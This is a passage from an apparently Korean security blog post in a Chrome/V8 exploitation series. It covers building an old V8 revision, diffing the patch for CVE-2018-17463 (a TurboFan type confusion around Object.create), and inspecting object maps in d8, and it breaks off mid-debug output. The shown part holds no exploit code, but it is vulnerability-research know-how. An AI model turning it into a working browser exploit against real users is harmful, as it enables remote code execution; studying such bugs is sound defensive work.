&#xCF54;&#xB4DC;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xC800;&#xC218;&#xC900; &#xC5B8;&#xC5B4;&#xC774;&#xC9C0;&#xB9CC;, &#xD070; &#xCC28;&#xC774;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xC5B4;&#xB294; CPU&#xC640; &#xAC19;&#xC740; &#xD2B9;&#xC815; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xC5D0; &#xC9C1;&#xC811; &#xBA85;&#xB839;&#xC744; &#xB0B4;&#xB9AC;&#xB294; &#xAE30;&#xACC4;&#xC5B4;&#xC758; &#xC778;&#xAC04; &#xCE5C;&#xD654;&#xC801;&#xC778; &#xD615;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; CPU &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0; &#xC885;&#xC18D;&#xC801;&#xC774;&#xBA70;, &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB824;&#xBA74; &#xD2B9;&#xC815; CPU&#xC5D0; &#xB9DE;&#xAC8C; &#xCEF4;&#xD30C;&#xC77C;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBC18;&#xBA74;, &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB294; &#xD2B9;&#xC815; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xC5D0; &#xC885;&#xC18D;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xCD94;&#xC0C1;&#xC801;&#xC778; &#xBA85;&#xB839;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB294; &#xB9C8;&#xCE58; &#xAC00;&#xC0C1;&#xC758; CPU(Virtual Machine)&#xCC98;&#xB7FC; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;(Ignition) &#xC704;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xB355;&#xBD84;&#xC5D0; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xCEF4;&#xD30C;&#xC77C; &#xACFC;&#xC815; &#xC5C6;&#xC774; &#xB2E4;&#xC591;&#xD55C; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC640; CPU&#xC5D0;&#xC11C; &#xC989;&#xC2DC; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C; <strong>D8&#xC740; V8 &#xC5D4;&#xC9C4;&#xC758; &#xAC1C;&#xBC1C; &#xBC0F; &#xB514;&#xBC84;&#xAE45;&#xC6A9; &#xC258;</strong>&#xC785;&#xB2C8;&#xB2E4;. D8&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC6F9; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xC5C6;&#xC774;&#xB3C4; V8 &#xC5D4;&#xC9C4;&#xC744; &#xC9C1;&#xC811; &#xC2E4;&#xD589;&#xD558;&#xACE0;,  <code>--print-bytecode</code>&#xC640; &#xAC19;&#xC740; &#xB514;&#xBC84;&#xAE45; &#xC635;&#xC158;&#xC744; &#xD1B5;&#xD574; &#xC5D4;&#xC9C4;&#xC758; &#xB0B4;&#xBD80; &#xB3D9;&#xC791;&#xC744; &#xC790;&#xC138;&#xD788; &#xB4E4;&#xC5EC;&#xB2E4;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; V8&#xC758; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0DD;&#xC131;&#xB418;&#xACE0; &#xC2E4;&#xD589;&#xB418;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xB370; &#xB9E4;&#xC6B0; &#xC720;&#xC6A9;&#xD55C; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xACFC;&#xC815;&#xC744; &#xB530;&#xB77C; &#xAC00;&#xAE30; &#xC704;&#xD574; &#xC774; D8&#xC744; &#xC798; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC2A4;&#xD15D;&#xBC14;&#xC774;&#xC2A4;&#xD15D;&#xC73C;&#xB85C; &#xAC00;&#xBD05;&#xC2DC;&#xB2E4;!</p><p>&#xBD84;&#xC11D;&#xAE00;&#xC740; <a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a> &#xB97C; &#xCC38;&#xACE0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; &#xC2E4;&#xC81C; V8&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; trigger &#xD558;&#xAE30; &#xC704;&#xD574; git version&#xC744; &#xB3CC;&#xB824;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs c">C:\dev\source\v8&gt;git checkout <span class="hljs-number">568979f</span>4d891bafec875fab20f608ff9392f4f29Updating files: <span class="hljs-number">100</span>% (<span class="hljs-number">15550</span>/<span class="hljs-number">15550</span>), done.Previous HEAD position was b801900344f [gtest] Clean up single-arg `testing::Invoke()`sHEAD is now at <span class="hljs-number">568979f</span>4d89 [parser] Fix memory accounting of explicitly cleared zones</code></pre><p>&#xD574;&#xB2F9; &#xBC84;&#xC804;&#xC744; &#xBE4C;&#xB4DC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC120; &#xB2E4;&#xC74C;&#xC744; &#xCD94;&#xAC00;&#xB85C; &#xC124;&#xCE58;&#xD574;&#xC918;&#xC57C;&#xD558;&#xB294;&#xB370;&#xC694;. </p><ul><li>MSVC v140 - VS 2015 C++ build tools (v14.00)</li><li>MSVC v141 - VS 2017 C++ x64/x86 build tools (v14.16)</li><li>Windows 10 SDK (10.0.17134.0)<ul><li>&#xBE44;&#xC2B7;&#xD55C; &#xBC84;&#xC804;&#xC774;&#xB77C;&#xBA74; &#xD3F4;&#xB354;&#xB97C; &#xBCF5;&#xC0AC;&#xD574;&#xC11C; &#xC774; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xB9DE;&#xCDB0;&#xC8FC;&#xC154;&#xB3C4; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; <code>10.0.19041.0</code> &#xC774;&#xAC78; &#xAE54;&#xACE0; &#xD3F4;&#xB354;&#xBA85;&#xC744; <code>10.0.17134.0</code> &#xB85C; &#xBC14;&#xAFE8;&#xC5B4;&#xC694;.</li></ul></li></ul><pre><code class="hljs c">C:\dev\source\v8&gt;gn gen --ide=vs out\x64.debugERROR at <span class="hljs-comment">//.gn:24:48: No value named &quot;exec_script_whitelist&quot; in scope &quot;build_dotfile_settings&quot;</span>exec_script_whitelist = build_dotfile_settings.exec_script_whitelist + []</code></pre><p>&#xBC14;&#xB85C; &#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC65C;&#xB0D0;&#xBA74; &#xC61B;&#xB0A0; &#xBC84;&#xC804;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC61B;&#xB0A0; &#xBC84;&#xC804;&#xC758; &#xBE4C;&#xB4DC; &#xB3C4;&#xAD6C;&#xB85C; &#xAC19;&#xC774; sync&#xB97C; &#xB9DE;&#xCDB0;&#xC918;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;. <del>(2018&#xB144;&#xB3C4; &#xC5B4;&#xB290;&#xB367;,,, 7&#xB144;&#xC804;&#xC774; &#xB418;&#xC5C8;&#xB124;&#xC694; TMI&#xC9C0;&#xB9CC; &#xC81C;&#xAC00; 18&#xB144;&#xB3C4;&#xC5D0; 20&#xC0B4;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;.&#x314E;)</del></p><p><code>gclient sync</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBE4C;&#xB4DC; &#xD234;&#xCCB4;&#xC778;&#xB3C4; sync&#xB97C; &#xB9DE;&#xCDB0;&#xC918;&#xC57C;&#xD558;&#xB294;&#xB370; python2&#xB85C; &#xBE4C;&#xB4DC;&#xD574;&#xC57C;&#xD558;&#xB2C8; <code>where python</code> &#xD588;&#xC744; &#xB54C; python2 &#xAC00; &#xC81C;&#xC77C; &#xC704;&#xC5D0; &#xB098;&#xC624;&#xAC8C; &#xD574;&#xC8FC;&#xC154;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB3C4; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB9DE;&#xCDB0;&#xC8FC;&#xC138;&#xC694;.</p><p><code>set GYP_MSVS_OVERRIDE_PATH=C:\Program Files (x86)\Microsoft Visual Studio 14.0</code></p><p>&#xADF8; &#xD6C4; &#xBE4C;&#xB4DC;&#xB97C; &#xD558;&#xBA74; &#xC798; &#xB428;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">c:\dev\source\v8&gt;gclient sync...Running hooks: <span class="hljs-number">100</span>% (<span class="hljs-number">30</span>/<span class="hljs-number">30</span>), done</code></pre><p>&#xB2E4;&#xC2DC; &#xB3CC;&#xC544;&#xC640;&#xC11C; &#xD06C;&#xB86C; &#xBE4C;&#xB4DC;&#xB97C; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">c:\dev\source\v8&gt;gn gen --ide=vs out\x64.debugGenerating Visual Studio projects took <span class="hljs-number">96</span>msDone. Made <span class="hljs-number">129</span> targets from <span class="hljs-number">74</span> files in <span class="hljs-number">1597</span>ms</code></pre><blockquote><p>&#xC800;&#xB294; &#xC5EC;&#xAE30;&#xC11C; ninja &#xBE4C;&#xB4DC;&#xAC00; &#xC548;&#xB418;&#xC5C8;&#xB294;&#xB370; &#xB418;&#xC2E0;&#xB2E4;&#xBA74; &#xC544;&#xB798; &#xB0B4;&#xC6A9;&#xC744; &#xC708;&#xB3C4;&#xC6B0;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD558;&#xC2DC;&#xBA74; &#xB418;&#xACE0; &#xC548;&#xB418;&#xC2E0;&#xB2E4;&#xBA74; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC11C; &#xD558;&#xC2DC;&#xBA74; &#xB418;&#xACA0;&#xC2B5;&#xB2C8;&#xB2F4; Part 4&#xC5D0;&#xC11C;&#xB294; 2023&#xB144;&#xB3C4; 1day&#xB97C; &#xB2E4;&#xB8E8;&#xB824;&#xACE0; &#xD558;&#xB294;&#xB370; &#xAC70;&#xAE30;&#xC11C;&#xB294; &#xC708;&#xB3C4;&#xC6B0;&#xC5D0;&#xC11C; &#xC2E4;&#xC2B5;&#xD560;&#xAC8C;&#xC694;!</p></blockquote><h1 id="2-CVE-2018-17463"><a href="#2-CVE-2018-17463" class="headerlink" title="2. CVE-2018-17463"></a>2. CVE-2018-17463</h1><p>CVE-2018-17463&#xC740; <code>Google Chrome Versions 69.0 and before</code> &#xC5D0;&#xC11C; Type Confusion&#xC73C;&#xB85C; Renderer&#xC5D0;&#xC11C; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5BB;&#xAC8C; &#xC774;&#xAC8C; &#xAC00;&#xB2A5;&#xD588;&#xB294;&#xC9C0; Root cause &#xBD80;&#xD130; &#xBD84;&#xC11D;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><h2 id="2-1-Root-Cause"><a href="#2-1-Root-Cause" class="headerlink" title="2.1 Root Cause"></a>2.1 <strong>Root Cause</strong></h2><p>JIT compiler&#xC778; Turbofan&#xC740; &#xC911;&#xBCF5;&#xB41C; IR &#xC744; &#xD0D0;&#xC9C0;&#xD558;&#xACE0; &#xC81C;&#xAC70;&#xD558;&#xC5EC; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC798;&#xBABB;&#xB41C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xBA74; <code>type check</code>&#xACFC; &#xAC19;&#xC740; &#xC548;&#xC804; &#xAC80;&#xC0AC;&#xB97C; &#xC81C;&#xAC70;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; Type Confusion&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Patch-Diffing"><a href="#Patch-Diffing" class="headerlink" title="Patch Diffing"></a><strong>Patch Diffing</strong></h3><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=888923">Issue 888923</a> &#xB97C; &#xBCF4;&#xBA74; <code>52a9e67a477bdb67ca893c25c145ef5191976220</code> &#xB77C;&#xB294; <a href="https://chromium.googlesource.com/v8/v8.git/+/52a9e67a477bdb67ca893c25c145ef5191976220">&#xCEE4;&#xBC0B;</a>&#xC5D0; </p><blockquote><p>[turbofan] Fix ObjectCreate&#x2019;s side effect annotation.</p></blockquote><p>&#xC73C;&#xB85C; &#xC62C;&#xB77C;&#xC640;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;</p><pre><code class="hljs c">C:\dev\source\v8&gt;git show <span class="hljs-number">52</span>a9e67a477bdb67ca893c25c145ef5191976220commit <span class="hljs-number">52</span>a9e67a477bdb67ca893c25c145ef5191976220Author: Jaroslav Sevcik &lt;jarin@chromium.org&gt;Date:   Wed Sep <span class="hljs-number">26</span> <span class="hljs-number">13</span>:<span class="hljs-number">23</span>:<span class="hljs-number">47</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0200</span>    [turbofan] Fix ObjectCreate<span class="hljs-number">&apos;</span>s side effect annotation.    Bug: chromium:<span class="hljs-number">888923</span>    Change-Id: Ifb22cd9b34f53de3cf6e47cd92f3c0abeb10ac79    Reviewed-on: https:<span class="hljs-comment">//chromium-review.googlesource.com/1245763</span>    Reviewed-by: Benedikt Meurer &lt;bmeurer@chromium.org&gt;    Commit-Queue: Jaroslav Sevcik &lt;jarin@chromium.org&gt;    Cr-Commit-Position: refs/heads/master@{#<span class="hljs-number">56236</span>}diff --git a/src/compiler/js-<span class="hljs-keyword">operator</span>.cc b/src/compiler/js-<span class="hljs-keyword">operator</span>.ccindex <span class="hljs-number">94b</span>018c987d.<span class="hljs-number">.5</span>ed3f74e075 <span class="hljs-number">100644</span>--- a/src/compiler/js-<span class="hljs-keyword">operator</span>.cc+++ b/src/compiler/js-<span class="hljs-keyword">operator</span>.cc@@ <span class="hljs-number">-622</span>,<span class="hljs-number">7</span> +<span class="hljs-number">622</span>,<span class="hljs-number">7</span> @@ <span class="hljs-function">CompareOperationHint <span class="hljs-title">CompareOperationHintOf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Operator* op)</span> </span>{   V(CreateKeyValueArray, Operator::kEliminatable, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)                \   V(CreatePromise, Operator::kEliminatable, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)                      \   V(CreateTypedArray, Operator::kNoProperties, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>)                   \-  V(CreateObject, Operator::kNoWrite, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)                            \+  V(CreateObject, Operator::kNoProperties, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)                       \   V(ObjectIsArray, Operator::kNoProperties, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)                      \   V(HasProperty, Operator::kNoProperties, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)                        \   V(HasInPrototypeChain, Operator::kNoProperties, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)                \diff --git a/test/mjsunit/compiler/regress<span class="hljs-number">-888923.</span>js b/test/mjsunit/compiler/regress<span class="hljs-number">-888923.</span>js<span class="hljs-keyword">new</span> file mode <span class="hljs-number">100644</span>...</code></pre><p><code>CreateObject</code> &#xB77C;&#xB294; Javascript &#xC758; Opreation&#xC5D0;&#xC11C;  <code>Operator::kNoWrite</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; <code>Operator::kNoProperties</code> &#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. NoWrite&#xB294; &#x201C;&#xAC1D;&#xCCB4;&#xC758; &#xC0C1;&#xD0DC;&#xAC00; &#xBCC0;&#xACBD;&#xB418;&#xC9C0; &#xC54A;&#xACA0;&#xB2E4;.&#x201D;&#xB294; &#xC758;&#xBBF8;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0;&#xC11C; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xAC31;&#xC2E0;&#xC774; &#xC5C6;&#xACA0;&#xB2E4;&#xB294; &#xC758;&#xBBF8;&#xC778;&#xB370;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Properties&#xC758; layout&#xC778; Map&#xC774; &#xBC14;&#xB00C;&#xB294; side effect&#xAC00; &#xC788;&#xC5B4;&#xC11C; Map&#xC774; &#xBC14;&#xB00C;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#x201C;&#xC774; &#xAC1D;&#xCCB4;&#xB294; &#xC18D;&#xC131;&#xC774; &#xBCC0;&#xD558;&#xC9C0; &#xC54A;&#xC544;.&#x201D;&#xB85C; Fix&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a>Code Review</h3><p>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; <code>Object.create(proto)</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC0C8; &#xAC1D;&#xCCB4;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0;, &#xADF8; &#xAC1D;&#xCCB4;&#xC758; <code>[[Prototype]]</code>&#xC744; <code>proto</code>&#xB85C; &#xC9C1;&#xC811; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC989;,</p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> animal = { <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;animal&quot;</span> };<span class="hljs-keyword">let</span> dog = <span class="hljs-built_in">Object</span>.create(animal);<span class="hljs-built_in">console</span>.log(dog.type); <span class="hljs-comment">// &quot;animal&quot;</span></code></pre><p>&#xC5EC;&#xAE30;&#xC11C; <code>dog</code> &#xAC1D;&#xCCB4;&#xB294; &#xC790;&#xCCB4;&#xC801;&#xC73C;&#xB85C; <code>type</code> &#xC18D;&#xC131;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC;, <code>[[Prototype]]</code>&#xC774; <code>animal</code>&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>dog.type</code>&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>Object.create</code>&#xB294; &#xC0C8;&#xB85C;&#xC6B4; prototype chain&#xC744; &#xC2DC;&#xC791;&#xD558;&#xB294; &#x201C;&#xC811;&#xCC29;&#xC81C; &#xC5ED;&#xD560;&#x201D;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xAC1D;&#xCCB4;&#xC640; prototype chain</p><ul><li>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; &#xBAA8;&#xB4E0; &#xAC1D;&#xCCB4;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>[[Prototype]]</code>&#xC774;&#xB77C;&#xB294; &#xC228;&#xC740; &#xB9C1;&#xD06C;&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xB9C1;&#xD06C;&#xB294; &#xB610; &#xB2E4;&#xB978; &#xAC1D;&#xCCB4;(&#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785;)&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0;, &#xADF8; &#xAC1D;&#xCCB4;&#xB3C4; &#xB610; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785;&#xC744; &#xAC00;&#xB9AC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xB807;&#xAC8C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xAD6C;&#xC870;&#xAC00; <strong>prototype chain</strong>&#xC785;&#xB2C8;&#xB2E4;.</li><li>JS&#xC5D0;&#xC11C; &#xC18D;&#xC131;&#xC774;&#xB098; &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xCC3E;&#xC744; &#xB54C;:<ol><li>&#xC790;&#xAE30; &#xC790;&#xC2E0;&#xC5D0;&#xAC8C;&#xC11C; &#xCC3E;&#xACE0;</li><li>&#xC5C6;&#xC73C;&#xBA74; <code>[[Prototype]]</code>&#xC744; &#xB530;&#xB77C; &#xC62C;&#xB77C;&#xAC00;&#xACE0;</li><li>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>null</code>&#xC744; &#xB9CC;&#xB0A0; &#xB54C;&#xAE4C;&#xC9C0; &#xBC18;&#xBCF5;&#xD569;&#xB2C8;&#xB2E4;.</li></ol></li></ul></blockquote><p><img src="image%202.png" alt="image.png"></p><p><code>ObjectCreate</code> &#xD568;&#xC218;&#xAC00; &#xC0C8;&#xB85C;&#xC6B4; map&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xACFC;&#xC815;&#xC744; &#xB530;&#xB77C;&#xAC00;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <code>ObjectCreate</code>&#xB77C;&#xB294; &#xD568;&#xC218;&#xB294; <code>prototype</code> &#xC744; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xACE0;, <code>GetObjectCreateMap</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="image%203.png" alt="image.png"></p><p><code>GetObjectCreateMap</code> &#xC5ED;&#xD560;&#xC740; <strong>&#xC8FC;&#xC5B4;&#xC9C4; prototype&#xC5D0; &#xB9DE;&#xB294; &#xAC1D;&#xCCB4; &#xC0DD;&#xC131; &#xB9F5;(Object Create Map)&#xC744; &#xBC18;&#xD658;</strong>&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; side effect &#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ol><li><code>JSObject::OptimizeAsPrototype</code>: &#xC804;&#xB2EC;&#xB41C; &#xAC1D;&#xCCB4;&#xB97C; &#x201C;&#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785;&#xC73C;&#xB85C; &#xC4F0;&#xAE30; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#x201D;&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;. &#xC989;, &#xC77C;&#xBC18; &#xAC1D;&#xCCB4;&#xB97C; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785; &#xAC1D;&#xCCB4;&#xB85C; &#xC804;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>Map::TransitionToPrototype</code>: &#xB9F5;&#xC744; &#xC0C8;&#xB85C;&#xC6B4; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785;&#xC5D0; &#xB9DE;&#xB3C4;&#xB85D; &#xC804;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, &#xAE30;&#xC874; &#xB9F5;&#xACFC;&#xC758; &#xC5F0;&#xACB0; &#xAD00;&#xACC4;&#xAC00; &#xBC14;&#xB01D;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774; &#xBD80;&#xBD84;&#xC774; &#xC911;&#xC694;&#xD55C; &#xC774;&#xC720;&#xB294;, &#xC774; &#xCF54;&#xB4DC;&#xAC00; &#x201C;&#xC0C8;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xAC1D;&#xCCB4;&#xAC00; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785; &#xAC1D;&#xCCB4;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xBA70;, &#xB3D9;&#xC2DC;&#xC5D0; &#xADF8; &#xAC1D;&#xCCB4;&#xC640; &#xC5F0;&#xACB0;&#xB41C; &#xB9F5;(map) &#xB610;&#xD55C; &#xBCC0;&#xACBD;&#xB41C;&#xB2E4;&#x201D;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB2E8;&#xC21C;&#xD788; <code>Object.create(proto)</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; <strong>&#xAC1D;&#xCCB4;&#xAC00; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785; &#xAC1D;&#xCCB4;&#xB85C; &#xBC14;&#xB00C;&#xACE0;, &#xADF8;&#xC640; &#xC5F0;&#xACB0;&#xB41C; &#xB9F5; &#xAD6C;&#xC870;&#xB3C4; &#xB2EC;&#xB77C;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</strong>.</p><h3 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h3><p>&#xC774;&#xC81C; &#xC774; &#xB0B4;&#xC6A9;&#xC744; <code>d8</code>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">C:\dev\source\v8&gt;out\x64.debug\d8 --allow-natives-syntaxV8 version <span class="hljs-number">14.2</span><span class="hljs-number">.0</span> (candidate)d8&gt; let obj = {x:<span class="hljs-number">13</span>};undefinedd8&gt; %DebugPrint(obj)DebugPrint: <span class="hljs-number">0x21700389515</span>: [JS_OBJECT_TYPE] - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x02170006c2fd</span> &lt;Map[<span class="hljs-number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt; - elements: <span class="hljs-number">0x0217000007bd</span> &lt;FixedArray[<span class="hljs-number">0</span>]&gt; [HOLEY_ELEMENTS] - properties: <span class="hljs-number">0x0217000007bd</span> &lt;FixedArray[<span class="hljs-number">0</span>]&gt; - All own properties (excluding elements): {    <span class="hljs-number">0x21700003601</span>: [String] in ReadOnlySpace: #x: <span class="hljs-number">13</span> (<span class="hljs-keyword">const</span> data field <span class="hljs-number">0</span>, attrs: [WEC]) @ Any, location: in-object }<span class="hljs-number">0x2170006c2fd</span>: [Map] in OldSpace - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x021700053419</span> &lt;MetaMap (<span class="hljs-number">0x021700053469</span> &lt;NativeContext[<span class="hljs-number">300</span>]&gt;)&gt; - type: JS_OBJECT_TYPE - instance size: <span class="hljs-number">16</span>   - inobject properties: <span class="hljs-number">1</span> - unused property fields: <span class="hljs-number">0</span> - elements kind: HOLEY_ELEMENTS - <span class="hljs-keyword">enum</span> length: invalid - stable_map - back pointer: <span class="hljs-number">0x02170006c2d5</span> &lt;Map[<span class="hljs-number">16</span>](HOLEY_ELEMENTS)&gt; - prototype_validity_cell: <span class="hljs-number">0x021700000ac9</span> &lt;Cell value= [cleared]&gt; - instance descriptors (own) #<span class="hljs-number">1</span>: <span class="hljs-number">0x021700389525</span> &lt;DescriptorArray[<span class="hljs-number">1</span>]&gt; - prototype: <span 